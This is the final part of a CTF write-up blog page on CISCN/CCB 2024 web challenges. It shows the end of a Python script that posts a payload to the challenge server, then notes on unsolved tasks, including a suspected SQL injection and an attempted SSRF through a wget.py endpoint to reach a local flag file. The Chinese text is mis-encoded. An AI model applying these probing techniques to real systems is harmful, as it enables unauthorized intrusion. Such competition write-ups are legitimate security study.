    <span class="token string">"http://47.93.212.188:32936"</span><span class="token punctuation">,</span>
    data<span class="token operator">=</span><span class="token punctuation">&#123;</span><span class="token string">"code"</span><span class="token punctuation">:</span> payload<span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    cookies<span class="token operator">=</span><span class="token punctuation">&#123;</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token keyword">print</span><span class="token punctuation">(</span>r<span class="token punctuation">.</span>text<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215100840684.png" alt="image-20241215100840684"></p>
<hr>
<h1 id="sxweb1ï¼ˆUnsolvedï¼‰"><a href="#sxweb1ï¼ˆUnsolvedï¼‰" class="headerlink" title="sxweb1ï¼ˆUnsolvedï¼‰"></a>sxweb1ï¼ˆUnsolvedï¼‰</h1><p>Apache&#x2F;2.4.58</p>
<p>ç›´æ¥è®¿é—® publishers.phpï¼Œè¿”å›<code>more lines returned. maybe SQL injection Attack</code></p>
<hr>
<h1 id="easywebï¼ˆUnsolvedï¼‰"><a href="#easywebï¼ˆUnsolvedï¼‰" class="headerlink" title="easywebï¼ˆUnsolvedï¼‰"></a>easywebï¼ˆUnsolvedï¼‰</h1><p>è¿›å»403ï¼Œå¼€æ‰«</p>
<p>æœ‰ä¸€ä¸ªä¸Šä¼ æ–‡ä»¶çš„æ¥å£å’Œä¸€ä¸ªä¸‹è½½æ–‡ä»¶çš„æ¥å£</p>
<p>ä¸‹è½½æ–‡ä»¶é™åˆ¶åç¼€ä¸º .txt å’Œ .zip</p>
<p>ä¸Šä¼ æ–‡ä»¶é™åˆ¶åç¼€ä¸ºå›¾ç‰‡ä¸”æ— å›æ˜¾è·¯å¾„</p>
<hr>
<h1 id="sxweb2ï¼ˆUnsolvedï¼‰"><a href="#sxweb2ï¼ˆUnsolvedï¼‰" class="headerlink" title="sxweb2ï¼ˆUnsolvedï¼‰"></a>sxweb2ï¼ˆUnsolvedï¼‰</h1><p>çœ‹èµ·æ¥åƒæ˜¯ 1 çš„è¿›é˜¶ç‰ˆï¼Œå®é™…ä¸Š 1 è¿˜æ˜¯0è§£</p>
<p>è¿›å»å‘ç°è·¯å¾„ç›´æ¥åœ¨ &#x2F;cgi-bin&#x2F;index.py äº†</p>
<p>å•ç‹¬è®¿é—® &#x2F;cgi-bin&#x2F; å¾—åˆ°</p>
<pre class="line-numbers language-txt" data-language="txt"><code class="language-txt">/
    html/
        index.html
        apache.jpg
    db/
        pubs.db
    cgi-bin/
        local/
            flag.py
        index.cgi
        authors.py
        index.py
        wget.py
        update_authorsform.py
        updateauthor.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p>ä½†æ˜¯ç›´æ¥è®¿é—® &#x2F;cgi-bin&#x2F;local&#x2F;flag.py ä¼šè¿”å›403</p>
<p>å°è¯•é€šè¿‡ wget.py è®¿é—® 127.0.0.1&#x2F;cgi-bin&#x2F;local&#x2F;flag.py ï¼Œè¿”å› Notice: local access is not allowed</p>
<p>&#x2F;bin&#x2F;authors.py</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215210603673.png" alt="image-20241215210603673"></p>
<p>&#x2F;cgi-bin&#x2F;update_authorsform.py</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215210619778.png" alt="image-20241215210619778"></p>
<p>&#x2F;cgi-bin&#x2F;updateauthor.py</p>
<p><img src="/blog/2024/12/15/CISCN-CCB2024/image-20241215210707260.png" alt="image-20241215210707260"></p>
<hr>
<h1 id="BookManagerï¼ˆUnsolvedï¼‰"><a href="#BookManagerï¼ˆUnsolvedï¼‰" class="headerlink" title="BookManagerï¼ˆUnsolvedï¼‰"></a>BookManagerï¼ˆUnsolvedï¼‰</h1>
    </div>
    
    
    
    
    
    
    
</div>

            </div>
        </transition>
        
        <transition name="fade">
            <div id="preview" ref="preview" v-show="previewShow">
                <img id="preview-content" ref="previewContent" />
            </div>
        </transition>
        
    </div>
    <script src="/blog/js/main.js"></script>
    
    




    
    

<div id="vcomments"></div>

<script src="/blog/js/lib/valine.min.js"></script>
<script>
    new Valine({
        el: '#vcomments',
        app_id: 'U9mZLKunkRUTcBFthjXPjnZE-9Nh9j0Va',
        app_key: 'SzWOnY0PWLGNuL6jW8TZYc7j',
        visitor: 'true',
        placeholder: 'å†™ç‚¹ä»€ä¹ˆå§(â—Ë‡âˆ€Ë‡â—)',
        serverURLs: 'https://u9mzlkun.lc-cn-n1-shared.com',
    });
</script>

    <footer id="footer">
    <div id="footer-wrap">
        <div>
            &copy;
            2022 - 2026 é›²æµã®Lowest World
            <span id="footer-icon">
                <i class="fa-solid fa-font-awesome fa-fw"></i>
            </span>
            &commat;C1oudfL0w0
        </div>
        <div>
            Based on the <a target="_blank" rel="noopener" href="https://hexo.io">Hexo Engine</a> &amp;
            <a target="_blank" rel="noopener" href="https://github.com/argvchs/hexo-theme-particlex">ParticleX Theme</a>
        </div>
        
    </div>
</footer>

<script src="/blog/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"model":{"jsonPath":"/blog/live2dw/assets/z16.model.json"},"display":{"position":"left","width":150,"height":290},"mobile":{"show":false},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/","tagMode":false});</script></body>

</html>